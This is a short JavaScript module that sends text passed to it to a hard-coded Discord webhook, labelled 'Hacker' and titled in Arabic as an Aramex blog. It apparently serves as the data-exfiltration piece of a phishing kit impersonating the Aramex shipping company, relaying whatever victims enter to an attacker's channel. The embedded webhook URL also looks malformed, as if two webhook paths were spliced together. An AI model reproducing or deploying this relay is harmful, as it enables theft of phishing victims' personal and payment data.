import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337749894688935969/j_yF4M1h6G_9u-44lp_TGPJHCPe3-SM6_KavkeddzUI5LZ6lldV5EVnAK_RFbaZlm2vBooks/1335207069904535694/B8iXi57-JN-cTcRw0D_uws8yPwTdZwBlguH-QvJsk_7WUNkzF_LwjIC9ZFjRG8IdekL-",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
